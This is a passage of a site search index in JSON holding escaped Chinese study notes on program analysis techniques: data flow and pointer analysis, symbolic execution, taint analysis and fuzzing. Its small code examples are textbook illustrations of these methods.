\u627e\u5230\u4e86\u4e0d\u6ee1\u8db3\u89c4\u8303\u7684\u6837\u4f8b\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_6","title":"\u5176\u4ed6","text":"<p>\u53cd\u7f16\u8bd1 VS \u53cd\u6c47\u7f16</p> <ul> <li> <p>\u53cd\u6c47\u7f16\uff1a\u5c06\u53ef\u6267\u884c\u7684\u6587\u4ef6\u4e2d\u7684\u4e8c\u8fdb\u5236\u7ecf\u8fc7\u5206\u6790\u8f6c\u53d8\u4e3a\u6c47\u7f16\u7a0b\u5e8f\u3002</p> </li> <li> <p>\u53cd\u7f16\u8bd1\uff1a\u53cd\u7f16\u8bd1\uff1a\u5c06\u53ef\u6267\u884c\u7684\u7a0b\u5e8f\u7ecf\u8fc7\u5206\u6790\u8f6c\u53d8\u4e3a\u9ad8\u7ea7\u8bed\u8a00\u7684\u6e90\u4ee3\u7801\u683c\u5f0f\uff0c\u4e00\u822c\u5b8c\u5168\u7684\u8f6c\u6362\u4e0d\u592a\u53ef\u80fd\uff0c\u7f16\u8bd1\u5668\u7684\u4f18\u5316\u7b49\u56e0\u7d20\u5728\u91cc\u9762\u3002</p> </li> </ul> <p>\u8fc7\u7a0b\u5185\u5206\u6790\uff08Intraprocess analysis\uff09 VS \u8fc7\u7a0b\u95f4\u5206\u6790\uff08Interprocedural analysis\uff09</p> <ul> <li>\u8fc7\u7a0b\u5185\u5206\u6790\uff1a\u4ec5\u5728\u5355\u4e2a\u51fd\u6570\u5185\u5206\u6790\uff0c\u901a\u8fc7 CFG \u5373\u53ef\u8fdb\u884c\uff0c\u901a\u5e38\u7528\u4e8e\u5c40\u90e8\u4f18\u5316\uff0c\u4f8b\u5982\u5bfb\u627e\u672a\u4f7f\u7528\u7684\u53d8\u91cf\u3001\u5e38\u91cf\u6298\u53e0\u3001\u6b7b\u4ee3\u7801\u6d88\u9664\u7b49\u3002</li> <li>\u8fc7\u7a0b\u95f4\u5206\u6790\uff1a\u5728\u591a\u4e2a\u51fd\u6570\u4e2d\u8fdb\u884c\u5206\u6790\uff0c\u8003\u8651\u7a0b\u5e8f\u7684\u5b8c\u6574\u7ed3\u6784\uff0c\u53ef\u7528\u4e8e\u66f4\u5e7f\u6cdb\u7684\u4f18\u5316\uff0c\u4f8b\u5982\u51fd\u6570\u5185\u8054\u3001\u6307\u9488\u5206\u6790\u3001\u6570\u636e\u6d41\u5206\u6790\u7b49\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_7","title":"\u5e38\u7528\u6280\u672f","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_8","title":"\u6570\u636e\u6d41\u5206\u6790","text":"<p>\u53c2\u89c1 <code>/corse/\u8f6f\u4ef6\u5206\u6790</code></p> <p>CFG\uff08control flow graphs\uff09\u662f\u9759\u6001\u5206\u6790\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u5176\u8282\u70b9\u901a\u5e38\u662f\u57fa\u672c\u5757\uff08basic block\uff09\uff0c\u57fa\u672c\u5757\u7684\u9996\u4e2a\u6307\u4ee4\u662f leader \u6307\u4ee4\uff0c\u6700\u540e\u4e00\u4e2a\u6307\u4ee4\u662f\u8df3\u8f6c\u6307\u4ee4\uff08\u8df3\u8f6c\u7684\u76ee\u7684\u5730\u662f leader \u6307\u4ee4\uff0c \u6b64\u65f6\u4e5f\u5c31\u662f\u57fa\u672c\u5757\uff09\u3002</p> <p>\u6570\u636e\u6d41\u5206\u6790\u5c31\u662f\u5206\u6790\u6570\u636e\u5728 CFG \u4e2d\u7684\u6d41\u52a8\uff0c\u4f8b\u5982\u53ef\u4ee5\u8fdb\u884c Reaching Definitions Analysis \u7b49\u5206\u6790\u3002\u7a0b\u5e8f\u5230\u8fbe\u4e0d\u5b9a\u70b9\u65f6\u7ec8\u6b62\u3002</p> <p>\u6570\u636e\u6d41\u5206\u6790\u662f\u8f6f\u4ef6\u5206\u6790\u4e2d\u9759\u6001\u5206\u6790\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u7ed3\u5408\u7b26\u53f7\u6267\u884c\u3001\u6c61\u70b9\u5206\u6790\u3001fuzzing \u6280\u672f\u53ef\u4ee5\u53d1\u6325\u5de8\u5927\u7684\u6548\u7528\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_9","title":"\u6307\u9488\u5206\u6790","text":"<p>\u8fd9\u4e2a\u5728 <code>/corse/\u8f6f\u4ef6\u5206\u6790</code>\u7684\u8bfe\u7a0b\u4e2d\u4e5f\u6709\u63d0\u5230\uff0c\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u5b66\u3002</p> <p>\u6307\u9488\u5206\u6790:https://zhuanlan.zhihu.com/p/79804033</p> <p>20230714 update:</p> <p>\u6307\u9488\u5206\u6790\u89e3\u7b54\u7684\u662f\u4e00\u4e2a\u6307\u9488\u53ef\u80fd\u6307\u5411\u54ea\u4e2a\u5bf9\u8c61\u7684\u95ee\u9898</p> <p>\u522b\u540d\u5206\u6790\uff1a\u522b\u540d\u5206\u6790\u89e3\u7b54\u7684\u662f\u4e24\u4e2a\u6307\u9488\u662f\u5426\u80fd\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\u7684\u95ee\u9898\uff0c\u5982\u679c\u662f\u5c31\u8ba4\u4e3a\u4e8c\u8005\u4e92\u4e3a\u522b\u540d\u3002</p> <p>\u6307\u9488\u5206\u6790\u6709\u4e24\u4e2a\u6307\u6807\u5373\u7cbe\u5ea6\uff08precision)\u548c\u901f\u5ea6\uff08efficiency)\uff0c\u6211\u4eec\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u5728\u8fd9\u4e24\u8005\u4e2d\u8fdb\u884c\u53d6\u820d\uff0c\u6709\u5f88\u591a\u56e0\u7d20\u4f1a\u5f71\u54cd\u8fd9\u4e24\u4e2a\u6307\u6807\uff1a</p> <p></p> <p>\u66f4\u591a\uff1ahttps://www.cnblogs.com/crossain/p/12767883.html</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_10","title":"\u7b26\u53f7\u6267\u884c","text":"<p>\u8bde\u751f\u4e8e 70 \u5e74\u4ee3\u4e2d\u671f\uff0c\u5176\u8bbe\u8ba1\u610f\u56fe\u662f\u7528\u4e8e\u6d4b\u8bd5\u8f6f\u4ef6\u662f\u5426\u4f1a\u8fdd\u53cd\u201c\u7ed9\u5b9a\u7279\u6027\u201d\uff1a</p> <ul> <li>\u5b89\u5168\u7279\u6027\uff1a\u4f8b\u5982\u7f13\u51b2\u533a\u6ea2\u51fa\u3001\u9664\u96f6\u3001\u7a7a\u6307\u9488\u89e3\u5f15\u7528\u7b49</li> <li>\u529f\u80fd\u7279\u6027</li> </ul> <p>\u7b26\u53f7\u6267\u884c\u91c7\u7528\u62bd\u8c61\u7684\u7b26\u53f7\u4ee3\u66ff\u7cbe\u786e\u503c\uff08\u5982\u6570\u5b57 1\uff09\u4f5c\u4e3a\u7a0b\u5e8f\u8f93\u5165\u53d8\u91cf</p> <p>\u7b26\u53f7\u6267\u884c\u7ef4\u62a4 \u7b26\u53f7\u72b6\u6001( symbolic state ) \u03c3 \u548c \u7b26\u53f7\u8def\u5f84\u7ea6\u675f( path constraint ) PC</p> <ul> <li>\u03c3 \u8868\u793a \u53d8\u91cf \u5230 \u7b26\u53f7\u8868\u8fbe\u5f0f \u7684\u6620\u5c04\uff0c\u521d\u59cb\u5316\u4e3a\u7a7a\u6620\u5c04\u3002</li> <li>PC \u662f\u7b26\u53f7\u8868\u793a\u7684\u4e0d\u542b\u91cf\u8bcd\u7684\u4e00\u9636\u8868\u8fbe\u5f0f\uff0c\u7528\u6765\u8868\u793a\u8def\u5f84\u7ea6\u675f\u6761\u4ef6\u3002\u521d\u59cb\u5316\u4e3a true\u3002</li> </ul> <pre><code>1 int twice(int v) {\n2    return 2 * v;\n3 }\n4\n5 void testme(int x, int y) {\n6     z = twice(y);\n7     if (z == x) {\n8         if (x &gt; y + 10)\n9             ERROR;\n10    }\n11 }\n12\n13 int main() {\n14     x = sym_input();\n15     y = sym_input();\n16     testme(x, y);\n17     return 0;\n18 }\n</code></pre> <p>\u7b26\u53f7\u72b6\u6001 \u03c3</p> <p>\u6bcf\u5f53\u9047\u5230\u8d4b\u503c\u8bed\u53e5\uff0c\u5c31\u4f1a\u5411\u7b26\u53f7\u72b6\u6001 \u03c3 \u4e2d\u6dfb\u52a0\u4e00\u4e2a\u6620\u5c04\u3002</p> <p>\u4ee5\u4e0a\u8ff0\u4ee3\u7801\u4e3a\u4f8b\uff0c\u5f53\u7a0b\u5e8f\u6267\u884c line 14 \u548c line 15 \u65f6\uff0c\u7b26\u53f7\u6267\u884c\u91c7\u7528\u62bd\u8c61\u7684\u7b26\u53f7\u4ee3\u66ff\u7cbe\u786e\u503c\u4f5c\u4e3a\u7a0b\u5e8f\u8f93\u5165\u53d8\u91cf\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c06\u7a0b\u5e8f\u8f93\u5165\u53d8\u91cf x\uff0c\u4f7f\u7528\u62bd\u8c61\u7684\u7b26\u53f7\u4ee3\u66ff\uff0c\u5982 x<sub>0</sub></p> <p>\u5728\u6267\u884c\u5b8c line 14 \u548c line 15 \u8d4b\u503c\u540e\uff0c\u7b26\u53f7\u72b6\u6001 \u03c3 \u4e2d\u6dfb\u52a0\u6620\u5c04\uff1a\u03c3 = { x\u2192x<sub>0</sub>, y\u2192y<sub>0</sub> }\uff0c\u6b64\u65f6 x<sub>0</sub>\u548c y<sub>0</sub>\u79f0\u4e3a \u4e0d\u53d7\u7ea6\u675f\u7684\u7b26\u53f7\u503c\u3002</p> <p>\u5f53\u6267\u884c\u5230 line 6 \u65f6\uff0c\u518d\u6b21\u6dfb\u52a0\u65b0\u7684 kv \u952e\u503c\u5bf9\uff0c\u6b64\u65f6\u7b26\u53f7\u72b6\u6001 \u03c3 \u4e3a\uff1a\u03c3 = { x\u2192x<sub>0</sub>, y\u2192y<sub>0</sub>, z\u21922y<sub>0</sub> }</p> <p>\u7b26\u53f7\u8def\u5f84\u7ea6\u675f PC</p> <p>\u6bcf\u5f53\u6761\u4ef6\u8bed\u53e5 <code>if (e) S1 else S2</code>\uff0cPC \u66f4\u65b0\u4e3a PC\u2227\u03c3(e)\uff0c\u8868\u793a then \u5206\u652f\uff1b\u540c\u65f6\u751f\u6210\u65b0\u7684\u8def\u5f84\u7ea6\u675f PC'\uff0c\u5e76\u4e14\u521d\u59cb\u5316\u4e3a PC\u2227\u00ac\u03c3(e)\uff0c\u8868\u793a else \u5206\u652f\u3002</p> <p>\u4ee5\u4e0a\u8ff0\u4ee3\u7801\u4e3a\u4f8b\uff0c\u5f53\u7a0b\u5e8f\u6267\u884c line 7 \u65f6\uff0c\u5efa\u7acb\u4e86\u4e24\u4e2a\u7b26\u53f7\u6267\u884c\u5b9e\u4f8b\uff0c\u8def\u5f84\u7ea6\u675f PC \u5206\u522b\u4e3a\uff1a2y<sub>0</sub> = x \u548c 2y<sub>0</sub> \u2260 x</p> <p>\u5f53\u6267\u884c\u5230 line8 \u65f6\uff0c\u518d\u6b21\u5efa\u7acb\u4e24\u4e2a\u65b0\u7684\u7b26\u53f7\u6267\u884c\u5b9e\u4f8b\uff0c\u8def\u5f84\u7ea6\u675f PC \u5206\u522b\u4e3a\uff1a(2y<sub>0</sub> = x)\u2227(x<sub>0</sub> &gt; y<sub>0</sub> + 10) \u548c (2y<sub>0</sub> = x)\u2227(x<sub>0</sub> \u2264 y<sub>0</sub> + 10)</p> <p>\u6267\u884c\u7ed3\u675f</p> <p>\u7b26\u53f7\u6267\u884c\u9047\u5230 exit \u6216\u8005 error\uff08\u6bd4\u5982\u7a0b\u5e8f\u5d29\u6e83\u6216\u8005\u8fdd\u53cd\u65ad\u8a00\uff09\uff0c\u5f53\u524d\u5b9e\u4f8b\u5c06\u4f1a\u7ec8\u6b62\u3002</p> <p>\u6b64\u65f6\u5229\u7528 \u7ea6\u675f\u6c42\u89e3\u5668\uff08e.g. \u4f7f\u7528\u53ef\u6ee1\u8db3\u6027\u6a21\u7406\u8bba\uff0cSMT\uff09\u5bf9\u5f53\u524d\u8def\u5f84\u7ea6\u675f\u6c42\u89e3\uff0c\u5f97\u5230 \u6d4b\u8bd5\u8f93\u5165\uff1b\u5982\u679c\u7a0b\u5e8f\u8f93\u5165\u8fd9\u4e9b\u5b9e\u9645\u503c\uff0c\u5c31\u4f1a\u5728\u540c\u6837\u8def\u5f84\u7ed3\u675f\u3002</p> <p>\u7b26\u53f7\u6267\u884c\u7684\u7f3a\u9677</p> <p>\u5982\u679c\u4ee3\u7801\u5305\u542b\u9012\u5f52\u6216\u8005\u5faa\u73af\uff0c\u4e14\u7ec8\u6b62\u6761\u4ef6\u7b26\u53f7\u5316\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u65e0\u6570\u6761\u8def\u5f84\uff08\u8def\u5f84\u7206\u70b8\uff09\u3002\u5f53\u7b26\u53f7\u8def\u5f84\u7ea6\u675f\u5305\u542b\u4e86\u4e0d\u80fd\u901a\u8fc7\u7ea6\u675f\u6c42\u89e3\u5668\u6c42\u89e3\u7684\u516c\u5f0f\u65f6\uff0c\u5c31\u4e0d\u80fd\u5f97\u5230\u8f93\u5165\u503c\u3002</p> <p>\u7b26\u53f7\u6267\u884c\u7684\u6311\u6218</p> <p></p> <p>\u89e3\u51b3\u65b9\u6848</p> <ul> <li> <p>\u8def\u5f84\u7206\u70b8</p> </li> <li> <p>\u5b8f\u89c2\u89d2\u5ea6</p> <ul> <li>\u9650\u5236\u7b26\u53f7\u6267\u884c\u6b21\u6570</li> <li>\u9650\u5236\u5faa\u73af\u8fed\u4ee3\u6b21\u6570</li> </ul> </li> <li> <p>\u5177\u4f53\u65b9\u6cd5</p> <ul> <li>\u542f\u53d1\u5f0f\u5730\u4f18\u5148\u63a2\u7d22\u5f53\u524d\u6700\u6709\u6548\u7684\u8def\u5f84</li> <li>\u4f7f\u7528\u53ef\u9760\u7684\u7a0b\u5e8f\u5206\u6790\u6280\u672f\u964d\u4f4e\u8def\u5f84\u63a2\u7d22\u7684\u590d\u6742\u6027</li> </ul> </li> <li> <p>\u7ea6\u675f\u6c42\u89e3</p> </li> <li>\u63d0\u9ad8\u7ea6\u675f\u6c42\u89e3\u5668\u7684\u80fd\u529b\uff0c\u5982\u4e0d\u76f8\u5173\u7684\u7ea6\u675f\u6d88\u9664\u3001\u589e\u91cf\u6c42\u89e3</li> </ul> <p>\u534e\u4e3a\u6848\u4f8b:</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6bcf\u5206\u6790\u4e00\u6761\u8bed\u53e5\uff0c\u5c31\u4f1a\u66f4\u65b0 \u7b26\u53f7\u72b6\u6001 \u03c3 \u548c \u7b26\u53f7\u8def\u5f84\u7ea6\u675f PC\uff08\u6b64\u5904\u4f7f\u7528 \u03c0 \u4ee3\u6307\uff09\uff0c\u6709\u4e9b\u5206\u652f\u662f\u663e\u7136\u4e0d\u4f1a\u8fdd\u53cd\u7ed9\u5b9a\u7279\u6027\u7684\uff0c\u5982\u53f3\u4e0a\u89d2\uff0c\\(1-0=0 \\and \u03b1_a = 0\\) \u662f\u4e0d\u53ef\u80fd\u4e3a True \u7684\uff0c\u4e5f\u5c31\u662f\u4e0d\u4f1a\u8fdd\u53cd\u7ed9\u5b9a\u7279\u6027\uff08assert\uff09\u3002</p> <p>\u800c\u5de6\u4e0b\u89d2\u7684\u5206\u652f\u5728 \\(\u03b1_a = 2 \\and \u03b1_b = 0\\)\u65f6\uff0c\u5c31\u4f1a\u8fdd\u53cd\u7279\u6027\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_11","title":"\u6c61\u70b9\u5206\u6790","text":"<p>\u6c61\u70b9\u5206\u6790\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u4e2a\u4e09\u5143\u7ec4<code>&lt;sources,sinks,sanitizers&gt;</code>\u7684\u5f62\u5f0f\uff1a</p> <ul> <li>source\uff1a\u6c61\u70b9\u6e90\uff0c\u4ee3\u8868\u76f4\u63a5\u5f15\u5165\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u6216\u8005\u673a\u5bc6\u6570\u636e\u5230\u7cfb\u7edf\u4e2d;</li> <li>sink\uff1a\u6c61\u70b9\u6c47\u805a\u70b9\uff0c\u4ee3\u8868\u76f4\u63a5\u4ea7\u751f\u5b89\u5168\u654f\u611f\u64cd\u4f5c(\u8fdd\u53cd\u6570\u636e\u5b8c\u6574\u6027)\u6216\u8005\u6cc4\u9732\u9690\u79c1\u6570\u636e\u5230\u5916\u754c(\u8fdd\u53cd\u6570\u636e\u4fdd\u5bc6\u6027);</li> <li>sanitizer\uff1a\u65e0\u5bb3\u5904\u7406\uff0c\u4ee3\u8868\u901a\u8fc7\u6570\u636e\u52a0\u5bc6\u6216\u8005\u79fb\u9664\u5371\u5bb3\u64cd\u4f5c\u7b49\u624b\u6bb5\u4f7f\u6570\u636e\u4f20\u64ad\u4e0d\u518d\u5bf9\u8f6f\u4ef6\u7cfb\u7edf\u7684\u4fe1\u606f\u5b89\u5168\u4ea7\u751f\u5371\u5bb3</li> </ul> <p>\u6c61\u70b9\u5206\u6790\u5c31\u662f\u5206\u6790\u7a0b\u5e8f\u4e2d\u7531\u6c61\u70b9\u6e90\u5f15\u5165\u7684\u6570\u636e\u662f\u5426\u80fd\u591f\u4e0d\u7ecf\u65e0\u5bb3\u5904\u7406\uff0c\u800c\u76f4\u63a5\u4f20\u64ad\u5230\u6c61\u70b9\u6c47\u805a\u70b9\u3002\u5982\u679c\u4e0d\u80fd\uff0c\u8bf4\u660e\u7cfb\u7edf\u662f\u4fe1\u606f\u6d41\u5b89\u5168\u7684;\u5426\u5219\uff0c\u8bf4\u660e\u7cfb\u7edf\u4ea7\u751f\u4e86\u9690\u79c1\u6570\u636e\u6cc4\u9732\u6216\u5371\u9669\u6570\u636e\u64cd\u4f5c\u7b49\u5b89\u5168\u95ee\u9898\u3002</p> <p>\uff08\u4ee5 cflow \u4e3a\u4f8b\uff09\u901a\u4fd7\u7684\u7406\u89e3\u5c31\u662f\uff0csource\uff0c\u4f8b\u5982\u5047\u8bbe\u4f60\u60f3\u7814\u7a76\u914d\u7f6e\u9879\u6f0f\u6d1e\uff0c\u90a3\u4e48\u4f60\u5c31\u628a\u914d\u7f6e\u9879\u4f5c\u4e3a\u6c61\u70b9\uff0c\u5c06\u6240\u6709\u5916\u90e8 API \u4f5c\u4e3a sink\uff0c\u901a\u8fc7\u6c61\u70b9\u5206\u6790\uff0c\u67e5\u770b\u6c61\u70b9\u4f20\u64ad\u8def\u5f84\uff0c\u4f8b\u5982 source -&gt; f1 -&gt; f2 -&gt; sink \u8fd9\u662f\u4e00\u6761\u4f20\u64ad\u8def\u5f84\u3002</p> <p>\u4f8b\u5b50\uff1a</p> <pre><code>[...]\nscanf(\"%d\", &amp;x);    // Source \u70b9\uff0c\u8f93\u5165\u6570\u636e\u88ab\u6807\u8bb0\u4e3a\u6c61\u70b9\u4fe1\u606f\uff0c\u5e76\u4e14\u8ba4\u4e3a\u53d8\u91cf x \u662f\u6c61\u67d3\u7684\n[...]\ny = x + k;          // \u5982\u679c\u4e8c\u5143\u64cd\u4f5c\u7684\u64cd\u4f5c\u6570\u662f\u6c61\u67d3\u7684\uff0c\u90a3\u4e48\u64cd\u4f5c\u7ed3\u679c\u4e5f\u662f\u6c61\u67d3\u7684\uff0c\u6240\u4ee5\u53d8\u91cf y \u4e5f\u662f\u6c61\u67d3\u7684\n[...]\nx = 0;              // \u5982\u679c\u4e00\u4e2a\u88ab\u6c61\u67d3\u7684\u53d8\u91cf\u88ab\u8d4b\u503c\u4e3a\u4e00\u4e2a\u5e38\u6570\uff0c\u90a3\u4e48\u8ba4\u4e3a\u5b83\u662f\u672a\u6c61\u67d3\u7684\uff0c\u6240\u4ee5 x \u8f6c\u53d8\u6210\u672a\u6c61\u67d3\u7684\n[...]\nwhile (i &lt; y)       // Sink \u70b9\uff0c\u5982\u679c\u89c4\u5b9a\u5faa\u73af\u7684\u6b21\u6570\u4e0d\u80fd\u53d7\u7a0b\u5e8f\u8f93\u5165\u7684\u5f71\u54cd\uff0c\u90a3\u4e48\u9700\u8981\u68c0\u67e5 y \u662f\u5426\u88ab\u6c61\u67d3\n</code></pre> <p>\u5f53\u7136\uff0c\u6c61\u70b9\u4e0d\u4ec5\u53ef\u4ee5\u901a\u8fc7\u6570\u636e\u4f9d\u8d56\u4f20\u64ad\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u4f9d\u8d56\u4f20\u64ad\u3002</p> <pre><code>if (x &gt; 0)\n    y = 1;\nelse\n    y = 0;\n</code></pre> <p>\u53d8\u91cf y \u7684\u53d6\u503c\u4f9d\u8d56\u4e8e\u53d8\u91cf x \u7684\u53d6\u503c\uff0c\u5982\u679c\u53d8\u91cf x \u662f\u6c61\u67d3\u7684\uff0c\u90a3\u4e48\u53d8\u91cf y \u4e5f\u5e94\u8be5\u662f\u6c61\u67d3\u7684\u3002</p> <p>https://www.bilibili.com/video/BV1Fq4y1B74m/ <code>1:11:00</code></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_12","title":"\u6a21\u7cca\u6d4b\u8bd5","text":"<p>\u6a21\u7cca\u6d4b\u8bd5\uff08fuzzing\uff09\u662f\u4e00\u79cd\u8f6f\u4ef6\u6d4b\u8bd5\u6280\u672f\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u662f\u5c06\u81ea\u52a8\u6216\u534a\u81ea\u52a8\u751f\u6210\u7684\u968f\u673a\u6570\u636e\u8f93\u5165\u5230\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u5e76\u76d1\u89c6\u7a0b\u5e8f\u5f02\u5e38\uff0c\u4ee5\u53d1\u73b0\u53ef\u80fd\u7684\u7a0b\u5e8f\u9519\u8bef\uff0c\u6bd4\u5982\u5185\u5b58\u6cc4\u9732\u7b49\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#fuzzing","title":"\u9ed1\u76d2 Fuzzing","text":"<p>Fuzzing \u7684\u76ee\u6807\u662f\u4e3a\u4e86\u66f4\u5feb\u3001\u66f4\u591a\u5730\u53d1\u73b0\u8f6f\u4ef6\u6f0f\u6d1e\uff0c\u5176\u57fa\u672c\u601d\u8def\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e0a\u8ff0\u662f\u9ed1\u76d2 Fuzzing \u7684\u601d\u8def\uff1a</p> <ul> <li>\u901a\u8fc7 Generator/Mutator \u7b49\u751f\u6210\u7b56\u7565\u751f\u6210\u8f93\u5165\uff0c\u7136\u540e\u5c06\u5176\u8f93\u5165\u5230\u76ee\u6807\u7a0b\u5e8f\u4e2d\uff0c\u5b58\u5728\u4e00\u4e2a Monitor \u76d1\u63a7\uff0c\u76d1\u63a7\u662f\u5426\u53d1\u751f\u5b89\u5168\u6f0f\u6d1e\u3002</li> <li>\u9ed1\u76d2 Fuzzing \u4e0d\u5173\u5fc3\u7a0b\u5e8f\u6267\u884c\u7684\u60c5\u51b5\uff0c\u800c\u4ec5\u4ec5\u53ea\u662f\u5c06\u7a0b\u5e8f\u4f5c\u4e3a\u9ed1\u76d2\uff0c\u76f4\u63a5\u4ea7\u751f\u8f93\u5165\u7136\u540e\u5c1d\u8bd5\u627e\u5230\u7ed3\u679c\u3002</li> <li>\u56e0\u6b64\uff0c\u9ed1\u76d2 Fuzzing \u53c8\u88ab\u79f0\u4e3a\u6570\u636e\u9a71\u52a8\u7684 Fuzzing\uff0c\u5927\u90e8\u5206\u4f20\u7edf\u7684 Fuzzing \u90fd\u662f\u9ed1\u76d2\u7684\u3002</li> </ul> <p>\u4e0e\u9ed1\u76d2\u76f8\u5bf9\u5e94\u7684\u8fd8\u6709\u767d\u76d2 Fuzzing\uff0c\u767d\u76d2 Fuzz \u5728\u6d4b\u8bd5\u4e4b\u524d\u901a\u5e38\u4f1a\u5148\u5bf9\u5e94\u7528\u8fdb\u884c\u5206\u6790\uff0c\u83b7\u53d6\u4e00\u5b9a\u7684\u4fe1\u606f\u6765\u8f85\u52a9\u5176\u521b\u5efa\u7684\u8f93\u5165\u80fd\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u53d1\u73b0\u5d29\u6e83\uff0c\u7b26\u53f7\u6267\u884c \u662f\u767d\u76d2 Fuzzing \u7684\u5e38\u7528\u6280\u672f\u3002</p> <p>\u9ed1\u76d2 Fuzzing \u7531\u4e8e\u53ea\u662f\u673a\u68b0\u7684\u91cd\u590d\u5c1d\u8bd5\u8f93\u5165\uff0c\u800c\u8f93\u5165\u53c8\u6709\u65e0\u6570\u79cd\u53ef\u80fd\uff0c\u56e0\u6b64\u6548\u7387\u4f4e\u4e0b\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#fuzzing_1","title":"\u7070\u76d2 Fuzzing","text":"<p>\u5728\u6b64\u5f15\u5165\u73b0\u4ee3 Fuzzing \u7684\u57fa\u672c\u601d\u60f3\uff1a\u9057\u4f20\u7b97\u6cd5\uff08Genetic Algorithm\uff09+ \u8986\u76d6\u7387\uff08Coverage\uff09\u7edf\u8ba1\u3002</p> <p>\u8986\u76d6\u7387</p> <p>\u8986\u76d6\u7387\u53ef\u5927\u81f4\u5206\u4e3a\u4e09\u79cd\uff1a</p> <ul> <li>Statement Coverage\uff1a\u8bed\u53e5\u8986\u76d6\u7387\uff0c\u5373\u5f53\u524d\u8f93\u5165\u4f1a\u8986\u76d6\uff08\u8fd0\u884c\uff09\u591a\u5c11\u6761\u8bed\u53e5</li> <li>Branch Coverage\uff1a\u5206\u652f\u8986\u76d6\u7387\uff0c\u5373\u5f53\u524d\u8f93\u5165\u4f1a\u8986\u76d6\uff08\u8fd0\u884c\uff09\u591a\u5c11\u4e2a\u5206\u652f\uff08if\uff09\uff0cif \u8bed\u53e5\u65e0\u8bba\u4e3a\u771f\u8fd8\u662f\u5047\u90fd\u7b97\u8fd0\u884c\u3002</li> <li>\u2606Edge Coverage\uff1a\u8fb9\u8986\u76d6\u7387\uff0c\u57fa\u4e8e Control Flow Graph\uff0c\u662f AFL \u8fd0\u7528\u7684\u8986\u76d6\u7387\uff0c\u5176\u539f\u7406\u5982\u4e0b\u56fe\uff1a</li> </ul> <p></p> <p>\u5982\u56fe\uff0c\u5de6\u8fb9\u662f\u5f85\u6d4b\u8bd5\u6e90\u7801\uff0c\u53f3\u8fb9\u662f\u63a7\u5236\u6d41\u56fe\u3002\u5f53<code>input = \"oops\"</code>\u65f6\uff0c\u5176\u7ecf\u8fc7\u7684\u63a7\u5236\u6d41\u56fe\u7684\u8fb9\u4e3a<code>B1-&gt;B2-&gt;...-&gt;B10</code>\u3002</p> <p>\u751f\u6210\u7b56\u7565</p> <p>\u7b80\u5355\u4ecb\u7ecd\u4e09\u79cd\uff1a</p> <ul> <li>Mutation-Based Fuzz\uff1a\u4e00\u822c\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5230\u591a\u4e2a\u6709\u6548\u7684\u6837\u672c\uff0c\u57fa\u4e8e\u53d8\u5f02 Fuzz \u65b9\u5f0f\u5bf9\u8fd9\u4e9b\u6837\u672c\u8fdb\u884c\u53d8\u5f02\u3002\u5e38\u7528\u7684\u65b9\u5f0f\u6709\u5b57\u8282\u7ea7\u8df3\u53d8\u3001\u5757\u7ea7\u522b\u7684\u66ff\u6362\u3001\u5220\u9664\u3001\u589e\u52a0\u3001\u91cd\u590d\u3001\u57fa\u4e8e\u5b57\u5178\u7684\u53d8\u5f02\u7b49\u3002</li> <li>Genertion-Based Fuzz\uff1a\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\u6709\u57fa\u4e8e\u968f\u673a\u5b57\u7b26\u7684\u751f\u6210\u3001\u57fa\u4e8e\u8bed\u6cd5\u7ed3\u6784\u7684\u751f\u6210\u7b49\u3002\u76f8\u5bf9 Mutation-Based 